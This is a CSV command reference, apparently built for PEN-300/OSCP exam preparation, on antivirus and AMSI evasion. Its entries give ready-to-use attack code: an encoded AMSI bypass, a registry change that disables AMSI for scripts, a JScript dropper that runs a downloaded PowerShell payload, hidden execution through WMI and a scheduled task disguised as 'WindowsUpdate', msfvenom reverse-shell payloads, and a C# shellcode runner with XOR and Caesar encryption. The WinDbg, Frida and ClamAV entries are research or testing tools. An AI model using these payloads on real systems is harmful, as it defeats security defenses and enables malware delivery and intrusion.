"id","name","category","command","description","subcategory","filled_example","notes","oscp_relevance","examples","educational","related_commands","troubleshooting","flag_explanations","prerequisites","alternatives","next_steps"
"amsi-base64-staging","Base64 AMSI Bypass Staging","amsi-bypass","powershell -EncodedCommand <BASE64_BYPASS>","Encode AMSI bypass in Base64 for command-line execution or evasion of string-based detections. Useful for initial access payloads.","","powershell -EncodedCommand W1JlZl0uQXNzZW1ibHkuR2V0VHlwZSgnU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHMnKS5HZXRGaWVsZCgnYW1zaUluaXRGYWlsZWQnLCdOb25QdWJsaWMsU3RhdGljJykuU2V0VmFsdWUoJG51bGwsJHRydWUp","Syntax:
Generate Base64 encoded bypass command Useful for phishing payloads, macro delivery, or any scenario where command-line arguments are exposed.

Pre-generate and test before exam.

Time estimate:
1 minute References:
docs/av-evasion/amsi-bypass.md#obfuscation Manual alternative:
Use alternate encodings (hex, compression), or deliver via encrypted channels (SSL/TLS)","","","","","","","","",""
"amsi-jscript-registry","AMSI Bypass for JScript (Registry)","amsi-bypass","var sh = new ActiveXObject(""WScript.Shell"");
var key = ""HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable"";
try {
    var val = sh.RegRead(key);
    if(val != 0) {
        sh.RegWrite(key, 0, ""REG_DWORD"");
    }
} catch(e) {
    sh.RegWrite(key, 0, ""REG_DWORD"");
}
WScript.Echo(""AMSI disabled for WSH"");","Disable AMSI for JScript/VBScript by setting AmsiEnable registry value to 0. Requires user-level registry access (HKCU).","","","Syntax:
Add to .js file before malicious operations Useful for Office macro chains (VBA -> WScript -> JScript -> Payload).

Persistent across reboots until key is removed.

Clean up for stealth.

Time estimate:
30 seconds References:
docs/av-evasion/amsi-bypass.md#jscript-bypass, PEN-300 Chapter 7.6 Manual alternative:
Execute JScript from non-AMSI context, use COM objects instead of WScript, or compile to executable with JScript.NET","","","","","","","","",""
"jscript-amsi-registry-bypass","JScript AMSI Registry Bypass","jscript-evasion","var sh = new ActiveXObject(""WScript.Shell"");
var key = ""HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable"";
try {
    var val = sh.RegRead(key);
    if(val != 0) {
        sh.RegWrite(key, 0, ""REG_DWORD"");
    }
} catch(e) {
    sh.RegWrite(key, 0, ""REG_DWORD"");
}
WScript.Echo(""AMSI disabled for WSH"");","Disable AMSI for JScript/VBScript by setting AmsiEnable registry value to 0. Requires user-level registry access (HKCU). Persists until key removed.","","","Syntax:
Save as .js file, execute with wscript.exe or cscript.exe Useful for VBA -> JScript attack chains.

Persistent (survives reboot) - good and bad.

Remember to clean up.

See also:
amsi-jscript-registry in amsi-bypass module.

Time estimate:
2 minutes References:
docs/av-evasion/jscript-evasion.md#amsi-registry-bypass, amsi-bypass.json#amsi-jscript-registry, PEN-300 Chapter 7.6.2 Manual alternative:
Execute JScript from non-AMSI context, use COM objects, or compile to .exe with JScript.NET","","","","","","","","",""
"jscript-self-modifying-exe","JScript Self-Modifying Executable","jscript-evasion","// Part 1: JScript dropper (beginning of .js file)
var fso = new ActiveXObject(""Scripting.FileSystemObject"");
var sh = new ActiveXObject(""WScript.Shell"");

// Read own file
var scriptPath = WScript.ScriptFullName;
var file = fso.OpenTextFile(scriptPath, 1);
var content = file.ReadAll();
file.Close();

// Extract payload after marker
var marker = ""###PAYLOAD###"";
var payloadStart = content.indexOf(marker) + marker.length;
var payload = content.substring(payloadStart);

// Write payload to temp file
var tempPath = sh.ExpandEnvironmentStrings(""%TEMP%"") + ""\\<OUTPUT_FILE>"";
var outFile = fso.CreateTextFile(tempPath, true);
outFile.Write(payload);
outFile.Close();

// Execute payload
sh.Run(tempPath, 0);

// Part 2: Embedded payload (after JScript code)
WScript.Quit();
###PAYLOAD###
<EMBEDDED_PAYLOAD_CONTENT>","Concatenate JScript dropper with embedded payload into single executable. WSH script reads own file, extracts embedded payload, writes to disk and executes. Evades initial AMSI scan.","","// Part 1: JScript dropper (beginning of .js file)
var fso = new ActiveXObject(""Scripting.FileSystemObject"");
var sh = new ActiveXObject(""WScript.Shell"");

// Read own file
var scriptPath = WScript.ScriptFullName;
var file = fso.OpenTextFile(scriptPath, 1);
var content = file.ReadAll();
file.Close();

// Extract payload after marker
var marker = ""###PAYLOAD###"";
var payloadStart = content.indexOf(marker) + marker.length;
var payload = content.substring(payloadStart);

// Write payload to temp file
var tempPath = sh.ExpandEnvironmentStrings(""%TEMP%"") + ""\\payload.ps1"";
var outFile = fso.CreateTextFile(tempPath, true);
outFile.Write(payload);
outFile.Close();

// Execute payload
sh.Run(tempPath, 0);

// Part 2: Embedded payload (after JScript code)
WScript.Quit();
###PAYLOAD###
IEX (New-Object Net.WebClient).DownloadString('http://...')","Syntax:
Create JScript dropper, append payload after marker, save as .js Creative evasion technique.

Initial scan sees benign dropper.

Payload extracted at runtime.

Good for embedding PowerShell scripts or small executables.

Test marker uniqueness.

~20 min to implement.

Time estimate:
20 minutes References:
docs/av-evasion/jscript-evasion.md#self-modifying, PEN-300 Chapter 7.6.3 Manual alternative:
Use HTTP download instead of embedding, encrypted payload sections, or multi-stage loaders","","","","","","","","",""
"jscript-wsh-obfuscation","JScript String Obfuscation","jscript-evasion","// Method 1: String.fromCharCode()
var cmd = String.fromCharCode(112,111,119,101,114,115,104,101,108,108); // ""powershell""

// Method 2: String concatenation
var cmd = ""pow"" + ""er"" + ""shell.exe"";

// Method 3: Array join
var parts = [""pow"", ""er"", ""shell""];
var cmd = parts.join("""") + "".exe"";

// Method 4: Base64 decode (custom function)
function b64decode(str) {
    var b64 = ""ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="";
    var decoded = """";
    // Decode implementation...
    return decoded;
}
var cmd = b64decode(""cG93ZXJzaGVsbC5leGU="");","Obfuscate suspicious strings in JScript using various encoding techniques. Evades simple string-based signatures.","","","Syntax:
Apply to suspicious strings in JScript code Quick win for JScript payloads.

Always obfuscate 'powershell', 'cmd', 'http', 'eval'.

Use random variable names.

String.fromCharCode() most effective.

~10 min to apply.

Time estimate:
10 minutes References:
docs/av-evasion/jscript-evasion.md#obfuscation Manual alternative:
Use eval() with encoded strings, external config files, or hex encoding","","","","","","","","",""
"jscript-com-execution","JScript COM Object Execution","jscript-evasion","// Method 1: WMI Process Creation
var wmi = GetObject(""winmgmts:\\\\.\\root\\cimv2"");
var startup = wmi.Get(""Win32_ProcessStartup"").SpawnInstance_();
startup.ShowWindow = 0; // Hidden
var process = wmi.Get(""Win32_Process"");
var pid = {};
process.Create(""<COMMAND>"", null, startup, pid);

// Method 2: Task Scheduler
var schedule = new ActiveXObject(""Schedule.Service"");
schedule.Connect();
var rootFolder = schedule.GetFolder(""\\"");
var taskDef = schedule.NewTask(0);
var action = taskDef.Actions.Create(0); // Execute
action.Path = ""<COMMAND>"";
rootFolder.RegisterTaskDefinition(""<TASK_NAME>"", taskDef, 6, null, null, 3);","Execute commands via COM objects instead of direct Shell.Run(). Uses WMI, Task Scheduler, or other COM interfaces to break behavioral patterns.","","// Method 1: WMI Process Creation
var wmi = GetObject(""winmgmts:\\\\.\\root\\cimv2"");
var startup = wmi.Get(""Win32_ProcessStartup"").SpawnInstance_();
startup.ShowWindow = 0; // Hidden
var process = wmi.Get(""Win32_Process"");
var pid = {};
process.Create(""powershell.exe -nop -w hidden -c ..."", null, startup, pid);

// Method 2: Task Scheduler
var schedule = new ActiveXObject(""Schedule.Service"");
schedule.Connect();
var rootFolder = schedule.GetFolder(""\\"");
var taskDef = schedule.NewTask(0);
var action = taskDef.Actions.Create(0); // Execute
action.Path = ""powershell.exe -nop -w hidden -c ..."";
rootFolder.RegisterTaskDefinition(""WindowsUpdate"", taskDef, 6, null, null, 3);","Syntax:
Replace <COMMAND> with payload command COM execution breaks simple parent-child monitoring.

WMI method more reliable than Task Scheduler.

Clean up tasks after execution.

Good for persistence too.

~15 min to implement.

Time estimate:
15 minutes References:
docs/av-evasion/jscript-evasion.md#com-execution Manual alternative:
Use WScript.Shell.Exec(), CreateObject(""Shell.Application"").ShellExecute(), or MMC20.Application COM object","","","","","","","","",""
"wscript-cscript-execution","WScript vs CScript Execution","jscript-evasion","# Execute with WScript (GUI mode, hidden)
wscript.exe //B //Nologo <SCRIPT_FILE>

# Execute with CScript (console mode)
cscript.exe //B //Nologo <SCRIPT_FILE>

# Force hidden execution (WScript)
wscript.exe //B //Nologo <SCRIPT_FILE>

# Within script, check execution mode:
var isConsole = (WScript.FullName.toLowerCase().indexOf(""cscript"") != -1);","Choose between WScript.exe (GUI) and CScript.exe (console) for JScript/VBScript execution. CScript better for stealth (no windows), WScript better for hidden execution.","","# Execute with WScript (GUI mode, hidden)
wscript.exe //B //Nologo payload.js

# Execute with CScript (console mode)
cscript.exe //B //Nologo payload.js

# Force hidden execution (WScript)
wscript.exe //B //Nologo payload.js

# Within script, check execution mode:
var isConsole = (WScript.FullName.toLowerCase().indexOf(""cscript"") != -1);","Syntax:
Execute from command line or within script WScript for GUI-less execution from shortcuts/scheduled tasks.

CScript for command-line integration.

Always use //B //Nologo for stealth.

Test both modes - different behavioral signatures.

Time estimate:
2 minutes References:
docs/av-evasion/jscript-evasion.md#execution-modes Manual alternative:
Use PowerShell Invoke-Expression, direct COM object instantiation, or mshta.exe for HTA execution","","","","","","","","",""
"windbg-attach-process","WinDbg Attach to Process","debugging","# Launch WinDbg (x64) and attach:
# File -> Attach to Process -> Select process -> OK

# Or via command line:
windbg.exe -p <PID>

# Common processes to debug:
# - powershell.exe (AMSI analysis)
# - cscript.exe / wscript.exe (JScript AMSI)
# - WINWORD.EXE (VBA analysis)","Attach WinDbg debugger to running process for live analysis. Essential for analyzing AMSI.DLL loading, function hooking, and runtime behavior.","","# Launch WinDbg (x64) and attach:
# File -> Attach to Process -> Select process -> OK

# Or via command line:
windbg.exe -p 1234

# Common processes to debug:
# - powershell.exe (AMSI analysis)
# - cscript.exe / wscript.exe (JScript AMSI)
# - WINWORD.EXE (VBA analysis)","Syntax:
Launch WinDbg, attach to target process WinDbg essential for understanding AMSI internals.

Attach to PowerShell to analyze AmsiScanBuffer.

Use sparingly in OSCP (time-consuming).

Good for lab research before exam.

~5 min setup time.

Time estimate:
5 minutes (first-time setup) References:
docs/av-evasion/debugging.md#windbg-basics, PEN-300 Chapter 7.1.1 Manual alternative:
Use x64dbg, OllyDbg (32-bit), or Visual Studio debugger","","","","","","","","",""
"windbg-breakpoint-commands","WinDbg Breakpoint Commands","debugging","# Set breakpoint on function
bp <MODULE>!<FUNCTION>

# Common AMSI breakpoints:
bp amsi!AmsiInitialize
bp amsi!AmsiOpenSession
bp amsi!AmsiScanBuffer
bp amsi!AmsiCloseSession

# Continue execution
g

# Step execution
p  # Step over
t  # Step into

# List breakpoints
bl

# Clear breakpoint
bc <BREAKPOINT_NUMBER>","Set breakpoints on functions to intercept execution. Critical for analyzing AMSI function flow (AmsiInitialize, AmsiScanBuffer, etc.).","","# Set breakpoint on function
bp amsi!AmsiScanBuffer

# Common AMSI breakpoints:
bp amsi!AmsiInitialize
bp amsi!AmsiOpenSession
bp amsi!AmsiScanBuffer
bp amsi!AmsiCloseSession

# Continue execution
g

# Step execution
p  # Step over
t  # Step into

# List breakpoints
bl

# Clear breakpoint
bc 0","Syntax:
Execute in WinDbg command window Breakpoints critical for AMSI research.

AmsiScanBuffer most important (called on every script scan).

Practice setting bp before exam.

Takes 1-2 min per breakpoint.

Time estimate:
2 minutes per breakpoint References:
docs/av-evasion/debugging.md#breakpoints, PEN-300 Chapter 7.1.1 Manual alternative:
Use x64dbg GUI, hardware breakpoints (ba command), or memory breakpoints","","","","","","","","",""
"windbg-memory-inspection","WinDbg Memory Inspection","debugging","# Display memory as DWORD (32-bit values)
dd <ADDRESS>

# Display memory as QWORD (64-bit values)
dq <ADDRESS>

# Display memory as ASCII string
dc <ADDRESS>

# Display memory as Unicode string
du <ADDRESS>

# Display memory as bytes
db <ADDRESS>

# Display specific number of values
dd <ADDRESS> L<COUNT>","Inspect memory contents at specific addresses. Essential for viewing AMSI context structures, shellcode buffers, and function parameters.","","# Display memory as DWORD (32-bit values)
dd rsp

# Display memory as QWORD (64-bit values)
dq rsp

# Display memory as ASCII string
dc rsp

# Display memory as Unicode string
du rsp

# Display memory as bytes
db rsp

# Display specific number of values
dd rsp L10","Syntax:
Execute in WinDbg after breaking at function Memory inspection reveals AMSI context structure (first 4 bytes:
""AMSI"").

Critical for understanding context corruption bypass.

Use 'du' for PowerShell strings (Unicode).

~1 min per inspection.

Time estimate:
1 minute References:
docs/av-evasion/debugging.md#memory-inspection, PEN-300 Chapter 7.2 Manual alternative:
Use Process Explorer memory viewer, x64dbg memory map, or CheatEngine","","","","","","","","",""
"windbg-disassemble","WinDbg Disassembly View","debugging","# Unassemble at current instruction pointer
u

# Unassemble specific address or function
u <ADDRESS>
u <MODULE>!<FUNCTION>

# Unassemble with length
u <ADDRESS> L<COUNT>

# Unassemble current function
uf .

# Unassemble specific function (full)
uf <MODULE>!<FUNCTION>","Disassemble machine code to assembly instructions. Shows function internals, allows understanding of AMSI validation logic and bypass opportunities.","","# Unassemble at current instruction pointer
u

# Unassemble specific address or function
u rip
u amsi!AmsiScanBuffer

# Unassemble with length
u rip L20

# Unassemble current function
uf .

# Unassemble specific function (full)
uf amsi!AmsiScanBuffer","Syntax:
Execute in WinDbg Understanding AmsiScanBuffer disassembly shows WHERE to patch for memory bypass.

Look for 'test', 'cmp', 'je' instructions (validation logic).

'xor rax, rax; ret' = clean return.

~10 min to analyze function.

Time estimate:
10 minutes (function analysis) References:
docs/av-evasion/debugging.md#disassembly, PEN-300 Chapter 7.4.1 Manual alternative:
Use IDA Pro, Ghidra, Binary Ninja, or x64dbg for static analysis","","","","","","","","",""
"frida-trace-amsi","Frida Trace AMSI Functions","debugging","# List running processes
frida-ps

# Trace AMSI functions in PowerShell process
frida-trace -p <PID> -x amsi.dll -i Amsi*

# Trace with detailed logging
frida-trace -p <PID> -x amsi.dll -i AmsiScanBuffer -i AmsiInitialize","Use Frida dynamic instrumentation to trace AMSI API calls. Non-invasive alternative to WinDbg for analyzing AMSI behavior without debugging.","","# List running processes
frida-ps

# Trace AMSI functions in PowerShell process
frida-trace -p 5432 -x amsi.dll -i Amsi*

# Trace with detailed logging
frida-trace -p 5432 -x amsi.dll -i AmsiScanBuffer -i AmsiInitialize","Syntax:
Execute from Kali or Windows with Frida installed Frida is powerful but may be blocked by AV/EDR.

Good for lab analysis before exam.

Shows WHAT PowerShell sends to AMSI for scanning.

Custom handlers reveal buffer contents.

~15 min setup first time.

Time estimate:
15 minutes (first-time setup) References:
docs/av-evasion/debugging.md#frida, PEN-300 Chapter 7.2.2 Manual alternative:
Use API Monitor, Process Monitor, or WinDbg for function tracing","","","","","","","","",""
"windbg-edit-memory","WinDbg Edit Memory (Live Patching)","debugging","# Edit memory (DWORD)
ed <ADDRESS> <NEW_VALUE>

# Edit memory (byte)
eb <ADDRESS> <BYTE1> <BYTE2> <BYTE3> ...

# Example: Patch AmsiScanBuffer to return clean
# Find function address:
x amsi!AmsiScanBuffer

# Patch with: xor rax,rax (48 31 C0); ret (C3)
eb <ADDRESS> 48 31 C0 C3","Modify memory at runtime to test patches. Allows live testing of AMSI bypass patches without recompiling code.","","# Edit memory (DWORD)
ed 7ffa12345678 90909090

# Edit memory (byte)
eb 7ffa12345678 48 0x12 0x34 ...

# Example: Patch AmsiScanBuffer to return clean
# Find function address:
x amsi!AmsiScanBuffer

# Patch with: xor rax,rax (48 31 C0); ret (C3)
eb 7ffa12345678 48 31 C0 C3","Syntax:
Execute in WinDbg after breaking Live patching validates bypass techniques before implementing in code.

Patch AmsiScanBuffer with 'xor rax,rax; ret' to test if bypass works.

Reversible (just restart process).

~5 min to test patch.

Time estimate:
5 minutes References:
docs/av-evasion/debugging.md#live-patching, PEN-300 Chapter 7.4.2 Manual alternative:
Use x64dbg patches, Cheat Engine, or process memory writers","","","","","","","","",""
"find-av-signature","Find-AVSignature (Binary Signature Location)","signature-evasion","Import-Module .\Find-AVSignature.ps1
Find-AVSignature -StartByte 0 -EndByte max -Interval <INTERVAL> -Path <TARGET_FILE> -OutPath <OUTPUT_DIR> -Verbose -Force","PowerShell script to locate exact byte offsets flagged by antivirus. Uses binary search (split-and-scan) to narrow down signature location in executable files.","","Import-Module .\Find-AVSignature.ps1
Find-AVSignature -StartByte 0 -EndByte max -Interval 10000 -Path C:\Tools\payload.exe -OutPath C:\Tools\avtest -Verbose -Force","Syntax:
Run on Windows with PowerShell, requires Find-AVSignature.ps1 script Time-consuming but precise.

Typical workflow:
10000→1000→100→10→1 byte intervals.

Takes 15-30 minutes per signature.

Practice on known-flagged payloads before exam.

Time estimate:
15-30 minutes per signature References:
docs/av-evasion/signature-evasion.md#find-av-signature, PEN-300 Chapter 6.3 Manual alternative:
Manual binary editing with hex editor (HxD, 010 Editor), or automated tools like ThreatCheck, DefenderCheck","","","","","","","","",""
"modify-signature-bytes","Modify Signature Bytes (PowerShell)","signature-evasion","$bytes = [System.IO.File]::ReadAllBytes('<INPUT_FILE>')
<MODIFICATIONS>
[System.IO.File]::WriteAllBytes('<OUTPUT_FILE>', $bytes)","Overwrite flagged byte offsets in binary file. Replace identified signature bytes with nulls or random values to break AV detection.","","$bytes = [System.IO.File]::ReadAllBytes('C:\Tools\payload.exe')
$bytes[18867] = 0x00
[System.IO.File]::WriteAllBytes('C:\Tools\payload_modified.exe', $bytes)","Syntax:
PowerShell byte modification Only modify bytes identified by Find-AVSignature.

Don't randomly modify - will corrupt exe.

Test modified binary before deploying.

May need multiple iterations.

Time estimate:
5 minutes per modification cycle References:
docs/av-evasion/signature-evasion.md#byte-modification, PEN-300 Chapter 6.3 Manual alternative:
Use hex editor manually (HxD, 010 Editor, Hex Fiend), or automated patching tools","","","","","","","","",""
"msfvenom-encoder-shikata","msfvenom Shikata Ga Nai Encoder (x86)","signature-evasion","msfvenom -p <PAYLOAD> LHOST=<LHOST> LPORT=<LPORT> -e x86/shikata_ga_nai -i <ITERATIONS> -f exe -o <OUTPUT_FILE>","Polymorphic XOR encoder for x86 payloads. Most well-known msfvenom encoder. Note: Heavily signatured by modern AV - use as baseline, not final solution.","","msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.14.5 LPORT=443 -e x86/shikata_ga_nai -i 10 -f exe -o payload.exe","Syntax:
Run on Kali Linux Shikata is famous but outdated.

Don't rely on it alone.

Useful as first layer before custom encryption.

Know limitations for exam.

Max 15-20 iterations before diminishing returns.

Time estimate:
1 minute References:
docs/av-evasion/signature-evasion.md#shikata-ga-nai, PEN-300 Chapter 6.4.1 Manual alternative:
Use alternate encoders (zutto_dekiru, xor_dynamic), custom encryption, or obfuscation frameworks","","","","","","","","",""
"msfvenom-encoder-zutto","msfvenom Zutto Dekiru Encoder (x64)","signature-evasion","msfvenom -p <PAYLOAD> LHOST=<LHOST> LPORT=<LPORT> -e x64/zutto_dekiru -i <ITERATIONS> -f exe -o <OUTPUT_FILE>","Polymorphic encoder for x64 payloads. x64 equivalent of shikata_ga_nai. Better than no encoding but still well-known to AV vendors.","","msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.5 LPORT=443 -e x64/zutto_dekiru -i 10 -f exe -o payload64.exe","Syntax:
Run on Kali Linux Use for x64 targets.

Same limitations as shikata.

Must combine with custom encryption or process injection for exam success.

Time estimate:
1 minute References:
docs/av-evasion/signature-evasion.md#zutto-dekiru, PEN-300 Chapter 6.4.1 Manual alternative:
Use custom loaders with AES encryption, process injection, or shellcode encryption","","","","","","","","",""
"msfvenom-encrypt-aes","msfvenom AES256 Encryption","signature-evasion","msfvenom -p <PAYLOAD> LHOST=<LHOST> LPORT=<LPORT> --encrypt aes256 --encrypt-key <KEY> -f exe -o <OUTPUT_FILE>","AES256 encryption for msfvenom payloads. Stronger than encoding - payload encrypted with key, decrypted at runtime. Requires key management.","","msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.5 LPORT=443 --encrypt aes256 --encrypt-key MySecretKey2024 -f exe -o payload_aes.exe","Syntax:
Run on Kali Linux Better than encoding but msfvenom's built-in decryptor is signatured.

For exam, use custom C# AES decryption for best results.

AES good for understanding concepts.

Time estimate:
1 minute References:
docs/av-evasion/signature-evasion.md#aes-encryption, PEN-300 Chapter 6.4.2 Manual alternative:
Custom AES implementation in C#/Python, XOR with multi-byte keys, or RC4 encryption","","","","","","","","",""
"msfvenom-template-injection","msfvenom Template Injection","signature-evasion","msfvenom -p <PAYLOAD> LHOST=<LHOST> LPORT=<LPORT> -x <TEMPLATE_EXE> -f exe -o <OUTPUT_FILE>","Inject payload into legitimate Windows executable using -x flag. Payload embedded in target binary, inherits legitimate code's reputation/signature.","","msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.5 LPORT=443 -x /usr/share/windows-binaries/nc.exe -f exe -o payload_injected.exe","Syntax:
Run on Kali Linux with template executable Template injection can improve trust but doesn't bypass modern AV signatures.

Best used with signed/legitimate binaries.

Test with and without -k flag.

Transfer legitimate Windows binaries to Kali for best templates.

Time estimate:
2 minutes References:
docs/av-evasion/signature-evasion.md#template-injection, PEN-300 Chapter 6.4 Manual alternative:
Manual PE injection with tools like CFF Explorer, PE-Bear, or custom Python scripts","","","","","","","","",""
"clamscan-test","ClamAV Signature Test","signature-evasion","cd 'C:\Program Files\ClamAV\'
.\clamscan.exe <TARGET_FILE>","Test binary against ClamAV signatures locally. Fast offline AV testing without uploading to VirusTotal. Useful for iterative testing during signature evasion.","","cd 'C:\Program Files\ClamAV\'
.\clamscan.exe C:\Tools\payload.exe","Syntax:
Run on Windows with ClamAV installed ClamAV is free baseline test.

Not comprehensive (misses many commercial signatures) but useful for rapid iteration.

Don't rely solely on ClamAV - test with Defender or Avira too.

Time estimate:
30 seconds per scan References:
docs/av-evasion/signature-evasion.md#testing, PEN-300 Chapter 6.2 Manual alternative:
Use online scanners (AntiScan.Me - doesn't distribute), VirusTotal (distributes to vendors), or Windows Defender locally","","","","","","","","",""
"csharp-shellcode-runner-basic","C# Shellcode Runner (Basic)","shellcode-runners","using System;
using System.Runtime.InteropServices;

namespace ShellcodeRunner {
    class Program {
        [DllImport(""kernel32"")]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        
        [DllImport(""kernel32"")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        
        [DllImport(""kernel32"")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
        
        static void Main(string[] args) {
            byte[] buf = new byte[] { <SHELLCODE> };
            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Marshal.Copy(buf, 0, addr, buf.Length);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}","Basic C# template for executing raw shellcode via VirtualAlloc → CreateThread → WaitForSingleObject pattern.
Foundation for all custom runners.","","using System;
using System.Runtime.InteropServices;

namespace ShellcodeRunner {
    class Program {
        [DllImport(""kernel32"")]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        
        [DllImport(""kernel32"")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        
        [DllImport(""kernel32"")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
        
        static void Main(string[] args) {
            byte[] buf = new byte[] { 0xfc,0x48,0x83,0xe4,0xf0 };
            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Marshal.Copy(buf, 0, addr, buf.Length);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}","Syntax:
Save as Program.cs, compile with csc.exe Basic runner will be flagged by modern AV.

Always add encryption (caesar/xor) or heuristic evasion before deploying.

Practice compiling on Windows target.

Time estimate:
2 minutes (with pre-generated shellcode) References:
docs/av-evasion/shellcode-runners.md#basic-runner, PEN-300 Chapter 6.5.1 Manual alternative:
Use Python ctypes, PowerShell reflection, or compiled languages (C/C++) for shellcode execution","","","","","","","","",""
"csharp-caesar-encrypt","C# Caesar Cipher Encryption","shellcode-runners","// ENCRYPTION (offline)
byte[] buf = new byte[] { <RAW_SHELLCODE> };
byte[] encoded = new byte[buf.Length];
for(int i = 0; i < buf.Length; i++) {
    encoded[i] = (byte)(((uint)buf[i] + <KEY>) & 0xFF);
}
// Print encoded array
Console.WriteLine(""byte[] encoded = new byte[] { "" + string.Join("","", encoded.Select(b => $""0x{b:X2}"")) + "" };"");

// DECRYPTION (runtime in runner)
for(int i = 0; i < buf.Length; i++) {
    buf[i] = (byte)(((uint)buf[i] - <KEY>) & 0xFF);
}","Encrypt shellcode with Caesar cipher (byte rotation).
Simple obfuscation to evade static signatures.
Decrypt at runtime before execution.","","// ENCRYPTION (offline)
byte[] buf = new byte[] { 0xfc,0x48,0x83 };
byte[] encoded = new byte[buf.Length];
for(int i = 0; i < buf.Length; i++) {
    encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
}
// Print encoded array
Console.WriteLine(""byte[] encoded = new byte[] { "" + string.Join("","", encoded.Select(b => $""0x{b:X2}"")) + "" };"");

// DECRYPTION (runtime in runner)
for(int i = 0; i < buf.Length; i++) {
    buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
}","Syntax:
Add encryption offline, add decryption to runner before VirtualAlloc Caesar cipher is weak but fast.

Good for lab practice.

For exam, use XOR or combine with heuristic evasion.

Key=2 is common in examples.

Time estimate:
5 minutes (encryption + integration) References:
docs/av-evasion/shellcode-runners.md#caesar-cipher, PEN-300 Chapter 6.5.2 Manual alternative:
Use XOR encryption (stronger), AES encryption (strongest), or custom encoding schemes","","","","","","","","",""
"csharp-xor-encrypt","C# XOR Encryption","shellcode-runners","// ENCRYPTION (offline)
byte[] buf = new byte[] { <RAW_SHELLCODE> };
byte[] encoded = new byte[buf.Length];
for(int i = 0; i < buf.Length; i++) {
    encoded[i] = (byte)((uint)buf[i] ^ <XOR_KEY>);
}

// DECRYPTION (runtime - same operation)
for(int i = 0; i < buf.Length; i++) {
    buf[i] = (byte)((uint)buf[i] ^ <XOR_KEY>);
}","XOR encryption for shellcode.
Stronger than Caesar cipher.
Each byte XORed with key, decrypt by XORing again (XOR is reversible).","","// ENCRYPTION (offline)
byte[] buf = new byte[] { 0xfc,0x48,0x83 };
byte[] encoded = new byte[buf.Length];
for(int i = 0; i < buf.Length; i++) {
    encoded[i] = (byte)((uint)buf[i] ^ 0xAA);
}

// DECRYPTION (runtime - same operation)
for(int i = 0; i < buf.Length; i++) {
    buf[i] = (byte)((uint)buf[i] ^ 0xAA);
}","Syntax:
XOR encrypt offline, XOR decrypt at runtime (same key) XOR is standard industry practice.

Key 0xAA common but predictable - use random key.

Combine with heuristic evasion for best results.

Time estimate:
5 minutes References:
docs/av-evasion/shellcode-runners.md#xor-encryption Manual alternative:
Use multi-byte XOR keys, AES encryption, or RC4 cipher for stronger protection","","","","","","","","",""
